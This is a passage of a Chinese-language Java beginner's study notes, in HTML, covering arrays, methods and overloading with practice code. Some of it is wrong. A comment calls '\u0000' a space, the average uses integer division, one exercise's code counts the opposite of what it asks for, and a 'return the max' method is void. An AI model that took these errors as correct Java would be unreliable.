class="hljs-string">&quot;zhangsan&quot;</span>;<br><br>    arr[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;lisi&quot;</span>;<br><br>        System.out.println(arr[<span class="hljs-number">0</span>]);<br><br>        System.out.println(arr[<span class="hljs-number">1</span>]);<br><br>        System.out.println(arr[<span class="hljs-number">2</span>]);<br><br>        <span class="hljs-comment">//数组默认初始化的规律</span><br>        <span class="hljs-comment">//整数类型：默认初始化为0</span><br>        <span class="hljs-comment">//小数类型：默认初始化为0.0</span><br>        <span class="hljs-comment">//字符类型：默认初始化为 &#x27;\u0000&#x27;，即空格</span><br>        <span class="hljs-comment">//布尔类型：默认初始化为 false</span><br>        <span class="hljs-comment">//引用数据类型：默认初始化为null</span><br><br>        <span class="hljs-type">int</span>[] arr2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">3</span>];<br><br>        System.out.println(arr2[<span class="hljs-number">0</span>]);<br><br>        System.out.println(arr2[<span class="hljs-number">1</span>]);<br><br>        System.out.println(arr2[<span class="hljs-number">2</span>]);<br><br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>结果：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs 1c">zhangsan<br>lisi<br><span class="hljs-literal">null</span><br><span class="hljs-number">0</span><br><span class="hljs-number">0</span><br><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>静态初始化和动态初始化的区别：</p><p><img src="/img/javalearn35.png" alt="javalearn35"></p><p>数组常见问题</p><ul><li>当访问了数组中不存在的索引，就会引发索引越界异常。</li></ul><p>数组常见操作</p><ul><li>求最值</li><li>求和</li><li>交换数据</li><li>打乱数据</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//求数组的最大值</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-type">int</span>[] arr = &#123;<span class="hljs-number">33</span>, <span class="hljs-number">22</span>, <span class="hljs-number">5</span>, <span class="hljs-number">44</span>, <span class="hljs-number">55</span>&#125;;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">max</span> <span class="hljs-operator">=</span> arr[<span class="hljs-number">0</span>]; <span class="hljs-comment">//注意这里的max初始值必须是数组中的值！</span><br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; arr.length; i++) &#123;<br><br>            <span class="hljs-keyword">if</span> (arr[i] &gt; max)&#123;<br><br>                max = arr[i];<br><br>            &#125;<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;数组中的最大值max为：&quot;</span> + max);<br>        &#125;<br>    &#125;<br><span class="hljs-comment">//求最小值也是一样的思路</span><br></code></pre></td></tr></table></figure><p>练习：遍历数组求和，求平均数，求有多少个数据比平均值小</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Random;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">sum</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">num2</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span>[] arr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">10</span>];<br><br>        <span class="hljs-type">Random</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>();<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; arr.length; i++) &#123;<br><br>            <span class="hljs-type">int</span> <span class="hljs-variable">number</span> <span class="hljs-operator">=</span> r.nextInt(<span class="hljs-number">100</span>) + <span class="hljs-number">1</span>;<br><br>            arr[i] = number;<br><br>        &#125;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">firstnum</span> <span class="hljs-operator">=</span> arr[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; arr.length; i++) &#123;<br>            sum = sum + arr[i];<br>            System.out.println(<span class="hljs-string">&quot;第&quot;</span> + i + <span class="hljs-string">&quot;个元素的值为：&quot;</span> + arr[i]);<br>        &#125;<br><br>        System.out.println(<span class="hljs-string">&quot;数组中这十个元素的和为：&quot;</span> + sum);<br>        <span class="hljs-type">double</span> <span class="hljs-variable">pingjunnum</span> <span class="hljs-operator">=</span> sum / <span class="hljs-number">10</span>;<br>        System.out.println(<span class="hljs-string">&quot;该数组的平均值为：&quot;</span> + pingjunnum);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; arr.length; i++) &#123;<br>            <span class="hljs-keyword">if</span> (arr[i] &gt; pingjunnum)&#123;<br>                num2 = num2 + <span class="hljs-number">1</span>;<br>            &#125;<br><br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;数组中共有：&quot;</span> + num2 + <span class="hljs-string">&quot;个数比平均值大&quot;</span>);<br>    &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>练习：交换数组中的数据</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">sum</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">num2</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span>[] arr = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>, j = arr.length - <span class="hljs-number">1</span>; i &lt; j; i++, j--)&#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">tmp</span> <span class="hljs-operator">=</span> arr[j];<br><br>            arr[j] = arr[i];<br><br>            arr[i] = tmp;<br><br><br><br><br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; arr.length; i++) &#123;<br><br>            System.out.println(arr[i]);<br><br>        &#125;<br><br><br><br>        &#125;<br><br>    &#125;<br><span class="hljs-comment">//练习：随机交换</span><br><span class="hljs-keyword">import</span> java.util.Random;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span>[] arr = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; arr.length; i++) &#123;<br>            <span class="hljs-type">Random</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>();<br><br>            <span class="hljs-type">int</span> <span class="hljs-variable">suiji</span> <span class="hljs-operator">=</span> r.nextInt(arr.length);<br><br>            <span class="hljs-type">int</span> <span class="hljs-variable">tmp</span> <span class="hljs-operator">=</span> arr[i];<br><br>            arr[i] = arr[suiji];<br><br>            arr[suiji] = tmp;<br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; arr.length; i++) &#123;<br><br>            System.out.println(arr[i]);<br><br>        &#125;<br>        &#125;<br>        &#125;<br></code></pre></td></tr></table></figure><p>Java内存分配</p><p><img src="/img/javalearn36.png" alt="javalearn36"></p><p><img src="/img/javalearn37.png" alt="javalearn37"></p><p><img src="/img/javalearan38.png" alt="javalearan38"></p><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><ul><li>方法是程序中最小的执行单元</li></ul><h4 id="方法的定义格式"><a href="#方法的定义格式" class="headerlink" title="方法的定义格式"></a>方法的定义格式</h4><ul><li>最简单的方法定义和调用</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> 方法名() &#123;<br>方法体<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>方法调用</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java">  方法名();<br>  <span class="hljs-comment">//方法必须先定义后调用</span><br>  <span class="hljs-comment">//写在main方法的外面，类的里面</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        playGame();<br>        &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">playGame</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;aa&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;BB&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;CC&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        plusWhat();<br>        &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">plusWhat</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span>;<br>        System.out.println(a + b);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>带参数的方法定义和调用</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> 方法名 (参数<span class="hljs-number">1</span>, 参数<span class="hljs-number">2.</span>...)&#123; &#125; <span class="hljs-comment">//注意数量和类型一一对应</span><br></code></pre></td></tr></table></figure><p>比如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        plusWhat(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>);<br>        &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">plusWhat</span><span class="hljs-params">(<span class="hljs-type">int</span> num1, <span class="hljs-type">int</span> num2)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">sum</span> <span class="hljs-operator">=</span> num1 + num2;<br>        System.out.println(sum);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>形参和实参</p><ul><li>形参：全称形式参数，是指方法定义中的参数。</li><li>实参：全称实际参数，方法调用中的参数。</li></ul><p>方法调用时形参实参一一对应。</p><p>带返回值方法的定义和调用</p><ul><li>方法的返回值其实就是方法运行的最终结果</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> 返回值类型 方法名 (参数)&#123;<br>方法体<br><span class="hljs-keyword">return</span> 返回值；<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getSum</span> <span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span>&#123;<br><span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> a + b;<br><span class="hljs-keyword">return</span> c；<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>带返回值方法的调用</li></ul><p>1.直接调用</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">方法名(实参)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>2.赋值调用</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">数据类型 变量名 <span class="hljs-operator">=</span> 方法名(实参)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>3.输出调用</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">sout(方法名 (实参))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs">1.我要干嘛？<br>2.需要什么？<br>3.方法的调用出，是否需要继续使用方法的结果。<br>如果需要，则必须有返回值<br>如果不需要，写不写返回值都行<br></code></pre></td></tr></table></figure><p>练习：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//比较大小</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">mianji1</span> <span class="hljs-operator">=</span> plusWhat(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">mianji2</span> <span class="hljs-operator">=</span> plusWhat(<span class="hljs-number">3</span>,<span class="hljs-number">4</span>);<br>        compare(mianji1,mianji2);<br>        &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">plusWhat</span><span class="hljs-params">(<span class="hljs-type">int</span> length, <span class="hljs-type">int</span> width)</span> &#123;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">mianji</span> <span class="hljs-operator">=</span> length * width;<br><br>        <span class="hljs-keyword">return</span> mianji;<br><br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(<span class="hljs-type">int</span> input1, <span class="hljs-type">int</span> input2)</span> &#123;<br><br>        <span class="hljs-keyword">if</span> ( input1 &gt; input2)&#123;<br>            System.out.println(<span class="hljs-string">&quot;第一个更大&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;第二个更大&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>注意事项：</p><ul><li>方法不调用就不执行</li><li>方法与方法之间是平级关系，不能互相嵌套定义。</li><li>方法的编写顺序和执行顺序无关。</li><li>方法的返回值类型为void，表示该方法没有返回值，没有返回值的方法可以省略return不写。如果非要写return，后面不能跟具体的数据。</li><li>return语句下面不能编写代码，因为永远执行不到。</li></ul><p>方法的重载</p><ul><li>在同一个类中，定义了多个同名的方法，这些同名的方法具有相同的功能。</li><li>每个方法具有不同的参数类型或参数个数，这些同名的方法就构成了重载关系。</li></ul><p>Java虚拟机会通过不同的参数来区分同名的方法，所以重载的关键是要把同种方法不同的形参区分开。</p><p><img src="/img/javalearn38.png" alt="javalearn38"></p><p>练习：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">equalWhat</span><span class="hljs-params">(<span class="hljs-type">int</span> num1, <span class="hljs-type">int</span> num2)</span> &#123;<br><br>        <span class="hljs-keyword">if</span> (num1 == num2)&#123;<br>            System.out.println(<span class="hljs-string">&quot;两数相等&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;不相同&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">equalWhat</span><span class="hljs-params">(<span class="hljs-type">double</span> num1, <span class="hljs-type">double</span> num2)</span> &#123;<br><br>        <span class="hljs-keyword">if</span> (num1 == num2)&#123;<br>            System.out.println(<span class="hljs-string">&quot;两数相等&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;不相同&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">equalWhat</span><span class="hljs-params">(<span class="hljs-type">short</span> num1, <span class="hljs-type">short</span> num2)</span> &#123;<br><br>        <span class="hljs-keyword">if</span> (num1 == num2)&#123;<br>            System.out.println(<span class="hljs-string">&quot;两数相等&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;不相同&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>练习：遍历一个数组的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-type">int</span>[] arr = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br><br>        equalWhat(arr);<br><br>        &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">equalWhat</span><span class="hljs-params">(<span class="hljs-type">int</span>[] arr)</span> &#123;<br><br>        System.out.print(<span class="hljs-string">&quot;[&quot;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; arr.length; i++) &#123;<br>            <span class="hljs-comment">//System.out.println(&quot;[&quot;);</span><br>            <span class="hljs-keyword">if</span> (i == arr.length - <span class="hljs-number">1</span>)&#123;<br>                System.out.print(arr[i]);<br>            &#125;<span class="hljs-keyword">else</span> &#123;<br>                System.out.print(arr[i] + <span class="hljs-string">&quot;, &quot;</span>);<br>            &#125;<br>        &#125;<br>        System.out.print(<span class="hljs-string">&quot;]&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>练习：设计一个方法求数组的最大值，并将最大值返回</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-type">int</span>[] arr = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br><br>        equalWhat(arr);<br><br>        &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">equalWhat</span><span class="hljs-params">(<span class="hljs-type">int</span>[] arr)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">max</span> <span class="hljs-operator">=</span> arr[<span class="hljs-number">0</span>];<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; arr.length; i++) &#123;<br><br>            <span class="hljs-keyword">if</span> (arr[i] &gt; max)&#123;<br>                max = arr[i];<br>            &#125;<br>        &#125;<br>        System.out.print(<span class="hljs-string">&quot;该数组的最大值是：&quot;</span> + max);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>练习：定义一个方法判断数组中的某一个数是否存在，将结果返回</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 